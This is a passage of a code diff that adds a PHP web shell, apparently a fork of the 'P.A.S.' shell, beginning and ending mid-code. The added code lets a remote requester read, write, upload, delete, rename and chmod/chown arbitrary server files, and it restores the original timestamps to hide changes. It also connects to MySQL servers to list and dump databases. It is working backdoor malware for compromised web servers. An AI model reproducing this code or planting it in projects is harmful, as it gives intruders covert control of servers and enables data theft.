+                         foreach ($v as $i)
+                            echo $i;
+                        return TRUE;
+                     }
+                }
+            }						
+            if (RO && is_int(readfile($p))){
+                return TRUE;
+			}
+
+            if (RO && copy($p, 'php://output'))
+                return TRUE;
+            
+            
+            if ($v = fopen($p, 'rb')) {
+                if (!is_int(fpassthru($v)))
+                    while (!feof($v))
+                        echo fread($v, 1048576);
+                fclose($v);
+                return TRUE;
+            }
+
+            if (PHP_VERSION >= '5'):
+                if (PHP_VERSION >= '5.1') {
+                    try {
+                        $v = new SplFileObject($p, 'rb');
+                    }
+                    catch (Exception $e) {
+                        $v = FALSE;
+                    }
+                    if ($v) {
+                        if (!is_int($v->fpassthru()))
+                            while (!$v->eof())
+                                echo $v->fgets();
+                        unset($v);
+                        return TRUE;
+                    }
+                }
+            endif;
+            if (PHP_VERSION >= '4.3') {
+                $v = file_get_contents($p);
+                if (is_string($v)) {
+                    echo $v;
+                    return TRUE;
+                }
+            }
+            $v = file($p);
+            if (is_array($v)) {
+                foreach ($v as $i)
+                    echo $i;
+                return TRUE;
+            }
+
+            return FALSE;
+        }
+        if (isset($D['s'])) {
+            $a = array();
+            $e = '{"e":"You have syntax error in %s pattern"}';
+            if (isset($D['n'])) {
+                if (isset($D['w'])) {
+                    $r = '#^';
+                    $c = '';
+                    $p = '';
+                    $q = 0;
+                    $b = FALSE;
+                    for ($i = 0, $l = strlen($D['n']); $i < $l; ++$i) {
+                        $c = $D['n'][$i];
+                        if ($q > 0 && $c !== '?') {
+                            $r .= '.';
+                            if ($q > 1)
+                                $r .= '{' . $q . '}';
+                            $q = 0;
+                        }
+                        switch ($c) {
+                            case '*':
+                                if ($c !== $p)
+                                    $r .= '.*';
+                                break;
+                            case '?':
+                                ++$q;
+                                break;
+                            case '\\':
+                                if ($i + 1 >= $l)
+                                    sDie(sprintf($e, 'name'));
+                                $r .= $c . $D['n'][++$i];
+                                break;
+                            case '[':
+                                ++$b;
+                                $r .= $c;
+                                break;
+                            case ']':
+                                --$b;
+                                $r .= $c;
+                                break;
+                            case '-':
+                                $r .= $b > 0 ? $c : '\\-';
+                                break;
+                            case '!':
+                                $r .= $p === '[' ? '^' : '\\!';
+                                break;
+                            default:
+                                $r .= addcslashes($c, '.+^$(){}=<>|:#');
+                                break;
+                        }
+                        $p = $c;
+                    }
+                    if ($q > 0) {
+                        $r .= '.';
+                        if ($q > 1)
+                            $r .= '{' . $q . '}';
+                    }
+                    $r .= '$#';
+                    if (isset($D['i']))
+                        $r .= 'i';
+                    if (preg_match($r, '') === FALSE)
+                        sDie(sprintf($e, 'name'));
+                    $a['r'] = $r;
+                } elseif (isset($D['i']))
+                    $a['i'] = $D['n'];
+                else
+                    $a['n'] = $D['n'];
+            }
+            if (isset($D['t'])) {
+                if (isset($D['x'])) {
+                    if (preg_match('#' . $D['x'] . '#', '') === FALSE)
+                        sDie(sprintf($e, 'text'));
+                    $a['x'] = '#' . $D['t'] . '#';
+                    if (isset($D['v']))
+                        $a['x'] .= 'i';
+                } elseif (isset($D['v']))
+                    $a['v'] = $D['t'];
+                else
+                    $a['t'] = $D['t'];
+            }
+            $i = array(
+                'l',
+                'd',
+                'y',
+                'p',
+                'u'
+            );
+            foreach ($i as $k)
+                if (isset($D[$k]))
+                    $a[$k] = (int) $D[$k];
+            $i = array(
+                'o',
+                'g',
+                'z'
+            );
+            foreach ($i as $k)
+                if (isset($D[$k])) {
+                    $s = explode(',', $D[$k]);
+                    foreach ($s as $n => $v)
+                        if (strpos($v, '-')) {
+                            $v         = explode('-', $v, 2);
+                            $a[$k][$n] = array(
+                                (int) $v[0],
+                                (int) $v[1]
+                            );
+                        } else
+                            switch (substr(trim($v), 0, 1)) {
+                                case '>':
+                                    $a[$k][$n][0] = (int) substr(trim($v), 1);
+                                    break;
+                                case '<':
+                                    $a[$k][$n][1] = (int) substr(trim($v), 1);
+                                    break;
+                                default:
+                                    $a[$k][$n] = (int) $v;
+                                    break;
+                            }
+                }
+            $i = array(
+                'e',
+                'm'
+            );
+            foreach ($i as $k)
+                if (isset($D[$k])) {
+                    $s = explode(',', $D[$k]);
+                    foreach ($s as $n => $v)
+                        if (strpos(' - ', $v)) {
+                            $v         = explode(' - ', $v, 2);
+                            $a[$k][$n] = array(
+                                strtotime(trim($v[0]) . 'UTC'),
+                                strtotime(trim($v[1]) . 'UTC')
+                            );
+                        } else
+                            switch (substr(trim($v), 0, 1)) {
+                                case '>':
+                                    $a[$k][$n][0] = strtotime(substr(trim($v), 1) . 'UTC');
+                                    break;
+                                case '<':
+                                    $a[$k][$n][1] = strtotime(substr(trim($v), 1) . 'UTC');
+                                    break;
+                                default:
+                                    $a[$k][$n] = strtotime(trim($v) . 'UTC');
+                                    break;
+                            }
+                }
+            $s = new Searcher($a);
+            foreach ($D['s'] as $v)
+                $s->search($v);
+            $s->finish();
+        }
+        if (isset($D['g'])) {
+            if ($D['g'] === '~' || $D['g'] === '')
+                $D['g'] = selfPath();
+            $i = new FileInfo($D['g']);
+            if (substr($D['g'], -1) === DSC || $i->isDir()) {
+                echo '{"p":';
+                if (substr($D['g'], -1) !== DSC)
+                    $D['g'] .= DSC;
+                jsonEcho($D['g']);
+                echo ',"m":', $i->getMode(), ',"f":[';
+                dirRead($i->getPathName(), 'outFileInfo');
+                echo ']';
+                outFileInfo(NULL, TRUE);
+                sDie('}');
+            }
+            echo "\x01\x02";
+            $b = outFile($D['g']);
+            echo "\x03\x1E";
+            if ($b) {
+                echo "\x06[";
+                jsonEcho($D['g']);
+                echo ',', $i->getMode(), ']';
+            } else
+                echo "\x15", $D['g'];
+            sDie("\x17\x04\x10");
+        }
+        if (isset($D['i'])) {
+            jsonFileInfo(new FileInfo($D['i']), TRUE);
+            sDie();
+        }
+        if (isset($D['h'])) {
+            echo '{';
+            $a = array();
+            $t = array();
+            $e = array();
+            $b = NULL;
+            $m = count($D['h']) > 1;
+            if ($m && isset($D['p']) && substr($D['p'], -1) !== DSC)
+                $D['p'] .= DSC;
+            if (isset($D['t']))
+                $D['t'] = strtotime($D['t'] . 'UTC');
+            if (isset($D['e']))
+                $D['e'] = intval($D['e'], 8);
+            if (isset($D['r']) && isInt($D['r']))
+                $D['r'] = (int) $D['r'];
+            if (isset($D['o']) && isInt($D['o']))
+                $D['o'] = (int) $D['o'];
+            sort($D['h']);
+            foreach ($D['h'] as $v) {
+                if (isset($D['p'])) {
+                    parsePath($v, $s, $n);
+                    if ($m) {
+                        $d = $D['p'];
+                        $p = $d . $n;
+                    } else {
+                        $d = filePath($D['p']);
+                        $p = $D['p'];
+                    }
+                    $c = array();
+                    if (!isset($t[$s])) {
+                        $i = new FileInfo($s);
+                        $i = $i->getMTime();
+                        if ($i)
+                            $c[$s] = $i;
+                    }
+                    if (!isset($t[$d])) {
+                        $i = new FileInfo($d);
+                        $i = $i->getMTime();
+                        if ($i)
+                            $c[$d] = $i;
+                    } else
+                        $i = $t[$d];
+                    if (!isset($D['t']) && $i)
+                        $c[$p] = $i;
+                    if (rename($v, $p)) {
+                        if ($s !== $b) {
+                            echo $b === NULL ? '"r":[' : ']},';
+                            echo '{"p":';
+                            jsonEcho($s);
+                            echo ',"f":[';
+                            $b = $s;
+                        } else
+                            echo ',';
+                        jsonEcho($n);
+                        $t += $c;
+                        $v     = $p;
+                        $a[$p] = 1;
+                    } else
+                        $e[$v][] = 'path';
+                }
+                if (isset($D['t'])) {
+                    if (touch($v, $D['t']))
+                        $a[$v] = 1;
+                    else
+                        $e[$v][] = 'modified date';
+                }
+                if (isset($D['e'])) {
+                    if (chmod($v, $D['e']))
+                        $a[$v] = 1;
+                    else
+                        $e[$v][] = 'permission';
+                }
+                if (isset($D['r'])) {
+                    if (chgrp($v, $D['r']))
+                        $a[$v] = 1;
+                    else
+                        $e[$v][] = 'group';
+                }
+                if (isset($D['o'])) {
+                    if (chown($v, $D['o']))
+                        $a[$v] = 1;
+                    else
+                        $e[$v][] = 'owner';
+                }
+            }
+            $b = $b !== NULL;
+            if ($b)
+                echo ']}]';
+            if (count($a) > 0) {
+                if ($b)
+                    echo ',';
+                else
+                    $b = TRUE;
+                echo '"c":[{"p":';
+                foreach ($t as $k => $v)
+                    touch($k, $v);
+                clearstatcache();
+                ksort($a);
+                $p = NULL;
+                foreach ($a as $v => $k) {
+                    $k = filePath($v);
+                    if ($k !== $p) {
+                        if ($p !== NULL)
+                            echo ']},{"p":';
+                        jsonEcho($k);
+                        echo ',"f":[';
+                        $p = $k;
+                    }
+                    outFileInfo($v);
+                }
+                echo ']}]';
+                outFileInfo(NULL, TRUE);
+            }
+            if ($e) {
+                if ($b)
+                    echo ',';
+                $b = FALSE;
+                echo '"e":[';
+                foreach ($e as $k => $v) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    jsonEcho(implode(', ', $v) . ' for ' . $k);
+                }
+                echo ']';
+            }
+            sDie('}');
+        }
+        if (isset($D['d'])) {
+            if (is_array($D['d'])) {
+                $v = new PZIP();
+                $v->init($D['DBP']);
+                foreach ($D['d'] as $i)
+                    $v->addPath($i);
+                $v->close();
+            }
+            $v = new FileInfo($D['d']);
+            if ($v->isDir()) {
+                $v = new PZIP();
+                $v->init($D['d']);
+                $v->addPath($D['d']);
+                $v->close();
+            }
+            if (outFile($D['d']) || defined('CED'))
+                sDie();
+            header('Content-Disposition: inline');
+            header('Content-Type: application/json; charset=' . CSE);
+            sDie('0');
+        }
+        if (isset($D['u'])) {
+            echo '{';
+            $a = array();
+            $e = array();
+            $b = FALSE;
+            $k = NULL;
+            sort($D['u']);
+            foreach ($D['u'] as $v) {
+                parsePath($v, $p, $n);
+                if (!isset($a[$p])) {
+                    $t = new FileInfo($p);
+                    $t = $t->getMTime();
+                } else
+                    $t = FALSE;
+                if (delFOD($v)) {
+                    if ($t)
+                        $a[$p] = $t;
+                    if (!$b) {
+                        echo '"r":[';
+                        $b = TRUE;
+                    }
+                    if ($p !== $k) {
+                        if ($k !== NULL)
+                            echo ']},';
+                        echo '{"p":';
+                        jsonEcho($p);
+                        echo ',"f":[';
+                        $k = $p;
+                    } else
+                        echo ',';
+                    jsonEcho($n);
+                } else
+                    $e[] = $v;
+            }
+            if ($b)
+                echo ']}]';
+            if ($e) {
+                if ($b)
+                    echo ',';
+                echo '"e":[';
+                foreach ($e as $k => $v) {
+                    if ($k > 0)
+                        echo ',';
+                    jsonEcho($v);
+                }
+                echo ']';
+            }
+            foreach ($a as $k => $v)
+                touch($k, $v);
+            sDie('}');
+        }
+        if (!empty($_FILES['f']) || !empty($_REQUEST['f'])) {
+			
+			if(is_array($_REQUEST['f']) && !isset($_FILES['f'])){
+				foreach ($_REQUEST['f'] as $k => $v) {
+					$_FILES['f']['name'][$k] = basename(key($v));
+					$_FILES['f']['tmp_name'][$k] = $v[$_FILES['f']['name'][$k]];
+					$_FILES['f']['error'][$k] = 0;
+				}
+			}
+			
+		    echo '{';
+		    $a = array();
+		    $b = FALSE;
+		    $i = new FileInfo($D['p']);
+		    $i = $i->getMTime();
+		    foreach ($_FILES['f']['error'] as $k => $v) {
+		        $n = $_FILES['f']['name'][$k];
+		        if ($v === 0) {
+		            $p = $D['p'] . $n;
+		            $t = $_FILES['f']['tmp_name'][$k];
+		            if (move_uploaded_file($t, $p) || rename($t, $p) || copy($t, $p) || link($t, $p) || (is_string($c = getFile($t)) && writeFile($p, $c)) || ($t[0] === 'd' && writeFile($p, base64_decode(substr(strrchr($t, ','), 1))))) {
+		                $a[] = $n;
+		                if ($i)
+		                    touch($p, $i);
+		                continue;
+		            }
+		        }
+		        if ($b)
+		            echo ',';
+		        else {
+		            $b = TRUE;
+		            echo '"e":[';
+		        }
+		        jsonEcho($v . $n);
+		    }
+		    if ($b)
+		        echo ']';
+		    if (count($a) > 0) {
+		        if ($i) {
+		            touch($D['p'], $i);
+		            clearstatcache();
+		        }
+		        if ($b)
+		            echo ',';
+		        echo '"p":';
+		        jsonEcho($D['p']);
+		        echo ',"f":[';
+		        foreach ($a as $v)
+		            outFileInfo($D['p'] . $v);
+		        echo ']';
+		        outFileInfo(NULL, TRUE);
+		    }
+		    sDie('}');
+		}
+        if (isset($D['w'])) {
+            $a = array();
+            if (is_file($D['w']) || file_exists($D['w'])) {
+                $i = new FileInfo($D['w']);
+                if ($i->isDir())
+                    sDie('{"e":"(path already exists as directory)"}');
+            } else {
+                $p     = filePath($D['w']);
+                $i     = new FileInfo($p);
+                $a[$p] = $i->getMTime();
+            }
+            $a[$D['w']] = $i->getMTime();
+            switch ($D['e']) {
+                case 0:
+                    $v = "\r\n";
+                    break;
+                case 1:
+                    $v = "\n";
+                    break;
+                case 2:
+                    $v = "\r";
+                    break;
+            }
+            $D['t'] = strtr($D['t'], array(
+                "\r\n" => $v,
+                "\r" => $v,
+                "\n" => $v
+            ));
+            if (writeFile($D['w'], $D['t'])) {
+				
+				if(function_exists('opcache_invalidate')) opcache_invalidate($D['w'], true);
+				
+                foreach ($a as $k => $v)
+                    if ($v)
+                        touch($k, $v);
+                clearstatcache();
+                $i = new FileInfo($D['w']);
+                echo "\x01\x02";
+                $b = outFile($D['w']);
+                echo "\x03\x1E";
+                if ($b) {
+                    echo "\x06";
+                    jsonFileInfo($i, TRUE);
+                } else
+                    echo "\x15", $D['w'];
+                sDie("\x17\x04\x10");
+            }
+            sDie('{"e":""}');
+        }
+        if (isset($D['l'])) {
+            $p = filePath($D['l']);
+            $t = new FileInfo($p);
+            $t = $t->getMTime();
+            if ($D['t'] == 0 ? symlink($D['p'], $D['l']) : link($D['p'], $D['l'])) {
+                if ($t) {
+                    if ($D['t'] != 0)
+                        touch($D['l'], $t);
+                    touch($p, $t);
+                    clearstatcache();
+                }
+                jsonFileInfo(new FileInfo($D['l']), TRUE);
+                sDie();
+            }
+            sDie('{"e":""}');
+        }
+        if (isset($D['m'])) {
+            if (is_file($D['m']) || is_dir($D['m']) || file_exists($D['m']))
+                sDie('{"e":"(path already exists)"}');
+            $p = filePath($D['m']);
+            $i = new FileInfo($p);
+            $i = $i->getMTime();
+            if (mkdir($D['m'], 0755)) {
+                if ($i) {
+                    touch($D['m'], $i);
+                    touch($p, $i);
+                    clearstatcache();
+                }
+                jsonFileInfo(new FileInfo($D['m']), TRUE);
+                sDie();
+            }
+            sDie('{"e":""}');
+        }
+        if (isset($D['f'])) {
+            echo '{';
+            $a = array();
+            $m = array();
+            $c = array();
+            $b = FALSE;
+            $t = new FileInfo($D['f']);
+            $t = $t->getMTime();
+            if (isset($D['v']))
+                foreach ($D['v'] as $v) {
+                    $i = new FileInfo($v);
+                    $j = $i->getMTime();
+                    $f = $D['f'] . $i->getFileName();
+                    $s = $i->getPath();
+                    if (!isset($a[$s])) {
+                        $n = new FileInfo($s);
+                        $n = $n->getMTime();
+                    } else
+                        $n = FALSE;
+                    if (rename($v, $f)) {
+                        if ($n)
+                            $a[$s] = $n;
+                        if ($j)
+                            $a[$f] = $j;
+                        $m[$s][] = $i->getFileName();
+                    } else {
+                        if ($b)
+                            echo ',';
+                        else {
+                            echo '"e":[';
+                            $b = TRUE;
+                        }
+                        jsonEcho($v);
+                    }
+                }
+            if (isset($D['p']))
+                foreach ($D['p'] as $v) {
+                    $i = new FileInfo($v);
+                    $f = $D['f'] . $i->getFileName();
+                    if (copy($v, $f) || link($v, $f) || (!$i->isDir() && is_string($s = getFile($v)) && writeFile($f, $s))) {
+                        $v = $i->getMTime();
+                        if ($v)
+                            $a[$f] = $v;
+                        $c[] = $i->getFileName();
+                    } else {
+                        if ($b)
+                            echo ',';
+                        else {
+                            echo '"e":[';
+                            $b = TRUE;
+                        }
+                        jsonEcho($v);
+                    }
+                }
+            if ($b)
+                echo ']';
+            if (count($m) > 0 || count($c) > 0) {
+                foreach ($a as $k => $v)
+                    touch($k, $v);
+                if ($t)
+                    touch($D['f'], $t);
+                clearstatcache();
+                if ($b)
+                    echo ',';
+                echo '"p":';
+                jsonEcho($D['f']);
+                if (count($m) > 0) {
+                    echo ',"m":[';
+                    $b = FALSE;
+                    foreach ($m as $k => $a) {
+                        if ($b)
+                            echo ',';
+                        else
+                            $b = TRUE;
+                        echo '{"p":';
+                        jsonEcho($k);
+                        outFileInfo(NULL, FALSE);
+                        echo ',"f":[';
+                        foreach ($a as $v)
+                            outFileInfo($D['f'] . $v);
+                        echo ']}';
+                    }
+                    echo ']';
+                }
+                if (count($c) > 0) {
+                    echo ',"c":[';
+                    $b = FALSE;
+                    foreach ($c as $v)
+                        outFileInfo($D['f'] . $v);
+                    echo ']';
+                }
+                outFileInfo(NULL, TRUE);
+            }
+            sDie('}');
+        }
+        break;
+    case 's':
+        define('T_DMPHDR', "-- \n-- This SQL dump created by P.A.S. Fork v." . VER . "\n-- \n-- Started at %s UTC\n");
+        define('T_DMPFTR', "-- Finished at %s UTC");
+        define('E_SLCTDT', "Can't load data from table %s\n");
+        define('E_CNSTCS', "Can't construct create statement for table %s\n");
+        define('E_CHNGDB', "Can't change database to %s for dump table %s.%s\n");
+        class SQLBase {
+            var $_cnct, $_res;
+            function connError($m, $h, $u, $p, $b) {
+                echo '{"e":';
+                jsonEcho($m ? $m : "Can't connect to SQL server" . ($h === NULL ? '' : ' ' . $h) . ($u === NULL ? '' : ' as user "' . $u . '"') . ($p === NULL ? '' : ' with password "' . $p . '"') . ($b === NULL ? '' : ' and select database "' . $b . '"') . '.');
+                sDie('}');
+            }
+            function getError() {
+                $v = $this->_cnct->errorInfo();
+                return $v[2];
+            }
+            function tryQueries($a) {
+                $i = $this->_cnct;
+                foreach ($a as $v)
+                    if ($this->_res = $i->query($v))
+                        return TRUE;
+                return FALSE;
+            }
+            function fetchAssoc() {
+                return $this->_res->fetch(PDO::FETCH_ASSOC);
+            }
+            function fetchRow() {
+                return $this->_res->fetch(PDO::FETCH_NUM);
+            }
+            function query($v) {
+                return ($this->_res = $this->_cnct->query($v));
+            }
+            function fetchBase() {
+                return $this->_res->fetchColumn(0);
+            }
+            function fetchTable() {
+                return $this->_res->fetchColumn(0);
+            }
+            function getColumnsNames($v) {
+                $a = array();
+                if (($v = $this->_cnct->query('SELECT * FROM ' . $v . ' LIMIT 1')) && ($v = $v->fetch(PDO::FETCH_ASSOC))) {
+                    foreach ($v as $k => $i)
+                        $a[$k] = '';
+                    return $a;
+                }
+                return FALSE;
+            }
+            function sqlTableSize($v) {
+                return ($v = $this->_cnct->query('SELECT COUNT(*) FROM ' . $v)) ? $v->fetchColumn(0) : '"?"';
+            }
+            function close() {
+                $this->_cnct = NULL;
+            }
+        }
+        function sqlJoinColumns($a, $f) {
+            if ($a) {
+                foreach ($a as $k => $v)
+                    $a[$k] = $f($v);
+                return implode(',', $a);
+            }
+            return '*';
+        }
+        function sqlOutCreate($t, $c, $d, $f) {
+            echo "\nCREATE TABLE ", $f($t), " (\n";
+            $b = FALSE;
+            foreach ($c as $k => $v) {
+                if ($b)
+                    echo ",\n";
+                else
+                    $b = TRUE;
+                echo '  ', $f($k), ' ', $v ? $v : $d;
+            }
+            echo "\n);\n";
+        }
+        function sqlOutInsert($t, $c) {
+            echo "\nINSERT INTO ", $t;
+            if ($c !== '*')
+                echo ' (', $c, ')';
+            echo ' VALUES';
+        }
+        function sqlOutValues($a, $f) {
+            echo "\n(";
+            $b = FALSE;
+            foreach ($a as $v) {
+                if ($b)
+                    echo ',';
+                else
+                    $b = TRUE;
+                if ($v === NULL)
+                    echo 'NULL';
+                else
+                    echo $f($v);
+            }
+            echo ')';
+        }
+        function csvOutValues($a) {
+            $c = 0;
+            $b = FALSE;
+            foreach ($a as $v) {
+                if ($b)
+                    echo ';';
+                else
+                    $b = TRUE;
+                if ($v === NULL)
+                    echo '\N';
+                else {
+                    $v = str_replace(array(
+                        '"',
+                        ';',
+                        "\r",
+                        "\n"
+                    ), array(
+                        '""',
+                        ';',
+                        '\r',
+                        '\n'
+                    ), $v, $c);
+                    echo $c > 0 ? '"' . $v . '"' : $v;
+                }
+            }
+        }
+        function mysqlEscData($v) {
+            return "'" . str_replace(array(
+                '\\',
+                "'",
+                '"',
+                "\0",
+                "\n",
+                "\r",
+                "\x1A"
+            ), array(
+                '\\\\',
+                "\\'",
+                '\\"',
+                '\\0',
+                '\\n',
+                '\\r',
+                '\\Z'
+            ), $v) . "'";
+        }
+        function mysqlEscName() {
+            $a = func_get_args();
+            foreach ($a as $k => $v)
+                $a[$k] = '`' . str_replace('`', '``', $v) . '`';
+            return implode('.', $a);
+        }
+        class MySQLBase extends SQLBase {
+            var $haveSchemas = FALSE, $canPaginate = TRUE;
+            function charset($k) {
+                $v = array(
+                    'utf8',
+                    'utf16',
+                    'cp1250',
+                    'cp1251',
+                    'latin1',
+                    'latin5',
+                    'cp1256',
+                    'cp1257',
+                    'latin1',
+                    'latin2',
+                    'greek',
+                    'hebrew',
+                    'latin5',
+                    'latin7',
+                    'big5',
+                    'gbk',
+                    'sjis',
+                    'euckr',
+                    'ujis',
+                    'cp866',
+                    'koi8r',
+                    'koi8u'
+                );
+                return isset($v[$k]) ? $v[$k] : 'utf8';
+            }
+            function parseCrtTbl($v) {
+                $a = array();
+                $n = '`((?:[^`]|``)+)`';
+                $l = ' \(((?:`(?:[^`]|``)+`,?)+)\)';
+                $t = '(?: USING (?:BTREE|HASH))?';
+                $c = '(?:\s+CONSTRAINT(?: `(?:[^`]|``)+)`)?\s+';
+                $e = '(`(?:[^`]|``)+`)';
+                preg_match_all('#^\s+' . $n . ' ([a-z]+)((?:\(| ).+)?,?$#Um', $v, $m);
+                foreach ($m[1] as $k => $i)
+                    $a[$i] = strtoupper($m[2][$k]) . $m[3][$k];
+                if (preg_match('#^' . $c . 'PRIMARY KEY' . $t . $l . '.*$#Um', $v, $m)) {
+                    preg_match_all('#' . $n . '#', $m[1], $m);
+                    foreach ($m[1] as $i)
+                        $a[$i] .= ', PRIMARY KEY';
+                }
+                if (preg_match_all('#^\s+(?:INDEX|KEY)(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
+                    foreach ($m[1] as $i => $k) {
+                        if ($k !== '')
+                            $k = ' ' . $k;
+                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
+                        foreach ($r[1] as $i)
+                            $a[$i] .= ', KEY' . $k;
+                    }
+                if (preg_match_all('#^' . $c . 'UNIQUE(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $t . $l . '.*$#Um', $v, $m))
+                    foreach ($m[1] as $i => $k) {
+                        if ($k !== '')
+                            $k = ' ' . $k;
+                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
+                        foreach ($r[1] as $i)
+                            $a[$i] .= ', UNIQUE KEY' . $k;
+                    }
+                if (preg_match_all('#^\s+(?:FULLTEXT|SPATIAL)(?: (?:INDEX|KEY))?(?: ' . $e . ')?' . $l . '.*$#Um', $v, $m))
+                    foreach ($m[1] as $i => $k) {
+                        if ($k !== '')
+                            $k = ' ' . $k;
+                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
+                        foreach ($r[1] as $i)
+                            $a[$i] .= ', FULLTEXT KEY' . $k;
+                    }
+                if (preg_match_all('#^' . $c . 'FOREIGN KEY(?: ' . $e . ')?' . $l . ' REFERENCES (`(?:[^`]|``)+` \((?:`(?:[^`]|``)+`,?)+\)).*$#Um', $v, $m))
+                    foreach ($m[1] as $i => $k) {
+                        if ($k !== '')
+                            $k = ' ' . $k;
+                        $k .= ' ' . $m[3][$i];
+                        preg_match_all('#' . $n . '#', $m[2][$i], $r);
+                        foreach ($r[1] as $i)
+                            $a[$i] .= ', FOREIGN KEY' . $k;
+                    }
+                return $a;
+            }
+            function prepType($v) {
+                $s = ($i = strpos($v[1], '(')) ? strtoupper(substr($v[1], 0, $i)) . substr($v[1], $i) : strtoupper($v[1]);
+                if ($v[2] === 'NO')
+                    $s .= ' NOT NULL';
+                if ($v[4] !== NULL)
+                    $s .= ' DEFAULT ' . mysqlEscData($v[4]);
+                if ($v[5] !== NULL)
+                    $s .= ' ' . strtoupper($v[5]);
+                switch ($v[3]) {
+                    case 'PRI':
+                        $s .= ' PRIMARY KEY';
+                        break;
+                    case 'UNI':
+                        $s .= ' UNIQUE KEY';
+                        break;
+                    case 'MUL':
+                        $s .= ', KEY(' . mysqlEscName($v[0]) . ')';
+                        break;
+                }
+                return $s;
+            }
+            function getBases() {
+                return $this->tryQueries(array(
+                    'SHOW DATABASES',
+                    'SHOW SCHEMAS',
+                    'SELECT schema_name FROM information_schema.schemata',
+                    'SELECT DISTINCT table_schema FROM information_schema.tables',
+                    'SELECT DISTINCT table_schema FROM information_schema.columns'
+                ));
+            }
+            function getTables($b) {
+                $v = mysqlEscData($b);
+                return $this->tryQueries(array(
+                    'SHOW TABLES FROM ' . mysqlEscName($b),
+                    'SELECT table_name FROM information_schema.tables WHERE table_schema=' . $v,
+                    'SELECT DISTINCT table_name FROM information_schema.columns WHERE table_schema=' . $v
+                ));
+            }
+            function getColumns($b, $t) {
+                $a = array();
+                $e = mysqlEscName($b, $t);
+                if ($this->tryQueries(array(
+                    'SHOW COLUMNS FROM ' . $e,
+                    'SHOW FIELDS FROM ' . $e,
+                    'DESC ' . $e,
+                    'DESCRIBE ' . $e,
+                    'SELECT column_name,column_type,is_nullable,column_key,column_default,extra FROM information_schema.columns WHERE table_name=' . mysqlEscData($t) . ' AND table_schema=' . mysqlEscData($b)
+                ))) {
+                    while ($v = $this->fetchRow())
+                        $a[$v[0]] = $this->prepType($v);
+                    return $a;
+                }
+                if ($this->query('SHOW CREATE TABLE ' . $e) && ($v = $this->fetchRow()))
+                    return $this->parseCrtTbl($v[1]);
+                return $a;
+            }
+            function select($b, $t, $c, $o, $l) {
+                return $this->query('SELECT ' . sqlJoinColumns($c, 'mysqlEscName') . ' FROM ' . mysqlEscName($b, $t) . ' LIMIT ' . $o . ',' . $l);
+            }
+            function outCreateTable($b, $t) {
+                if ($this->query('SHOW CREATE TABLE ' . mysqlEscName($b, $t)) && ($v = $this->fetchRow())) {
+                    echo "\n", $v[1], ";\n";
+                    return '';
+                }
+                if ($v = $this->getColumns($b, $t)) {
+                    sqlOutCreate($t, $v, 'BLOB', 'mysqlEscName');
+                    return '';
+                }
+                return sprintf(E_CNSTCS, $b . '.' . $t);
+            }
+        }
+        class MySQLClient extends MySQLBase {
+            function connect($h, $u, $p, $b, $c) {
+                if (!($this->_cnct = mysql_connect($h, $u, $p)))
+                    return FALSE;
+                mysql_query('SET NAMES ' . $this->charset($c), $this->_cnct);
+                if ($b !== NULL && !mysql_select_db($b, $this->_cnct))
+                    return mysql_query('USE ' . mysqlEscName($b), $this->_cnct);
+                return TRUE;
+            }
+            function getError() {
+                if ($this->_cnct) {
+                    $v = mysql_error($this->_cnct);
+                    mysql_close($this->_cnct);
+                    return $v;
+                }
+                return mysql_error();
+            }
+            function tryQueries($a) {
+                foreach ($a as $v)
+                    if ($this->_res = mysql_query($v, $this->_cnct))
+                        return TRUE;
+                return FALSE;
+            }
+            function getBases() {
+                return (($this->_res = mysql_list_dbs($this->_cnct)) || parent::getBases());
+            }
+            function fetchBase() {
+                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function fetchTable() {
+                return ($v = mysql_fetch_row($this->_res)) ? $v[0] : FALSE;
+            }
+            function getTables($b) {
+                return (($this->_res = mysql_list_tables($b, $this->_cnct)) || parent::getTables($b));
+            }
+            function getTableSize($b, $t) {
+                return ($v = mysql_query('SELECT COUNT(*) FROM ' . mysqlEscName($b, $t), $this->_cnct)) ? mysql_result($v, 0) : '"?"';
+            }
+            function getColumns($b, $t) {
+                if ($a = parent::getColumns($b, $t))
+                    return $a;
+                $e = mysqlEscName($b, $t);
+                $q = FALSE;
+                if (($q = mysql_list_fields($b, $t, $this->_cnct)) || ($q = mysql_query('SELECT * FROM ' . $e . ' LIMIT 0', $this->_cnct))) {
+                    if ($v = mysql_fetch_field($q)) {
+                        do {
+                            $s = $v->type === 'string' ? 'TEXT' : strtoupper($v->type);
+                            if ($v->unsigned)
+                                $s .= ' UNSIGNED';
+                            if ($v->zerofill)
+                                $s .= ' ZEROFILL';
+                            if ($v->not_null)
+                                $s .= ' NOT NULL';
+                            if (isset($v->def) && $v->def !== '' && $v->def !== NULL)
+                                $s .= ' DEFAULT ' . mysqlEscData($v->def);
+                            if ($v->primary_key)
+                                $s .= ' PRIMARY KEY';
+                            elseif ($v->unique_key)
+                                $s .= ' UNIQUE KEY';
+                            elseif ($v->multiple_key)
+                                $s .= ', KEY(' . mysqlEscName($v->name) . ')';
+                            $a[$v->name] = $s;
+                        } while ($v = mysql_fetch_field($q));
+                        return $a;
+                    }
+                    if (is_string($v = mysql_field_name($q, 0))) {
+                        $i = 0;
+                        do {
+                            if (is_string($s = mysql_field_type($q, $i)))
+                                $a[$v] = $s === 'string' ? 'TEXT' : strtoupper($s);
+                            if (($a[$v] === 'INT' || $a[$v] === 'REAL') && ($s = mysql_field_len($q, $i)))
+                                $a[$v] .= '(' . $s . ')';
+                            if (is_string($s = mysql_field_flags($q, $i))) {
+                                if (strpos($s, 'unsigned') !== FALSE)
+                                    $a[$v] .= ' UNSIGNED';
+                                if (strpos($s, 'zerofill') !== FALSE)
+                                    $a[$v] .= ' ZEROFILL';
+                                if (strpos($s, 'not_null') !== FALSE)
+                                    $a[$v] .= ' NOT NULL';
+                                if (strpos($s, 'auto_increment') !== FALSE)
+                                    $a[$v] .= ' AUTO_INCREMENT';
+                                if (strpos($s, 'primary_key') !== FALSE)
+                                    $a[$v] .= ' PRIMARY KEY';
+                                elseif (strpos($s, 'unique_key') !== FALSE)
+                                    $a[$v] .= ' UNIQUE KEY';
+                                elseif (strpos($s, 'multiple_key') !== FALSE)
+                                    $a[$v] .= ', KEY(' . mysqlEscName($v) . ')';
+                            }
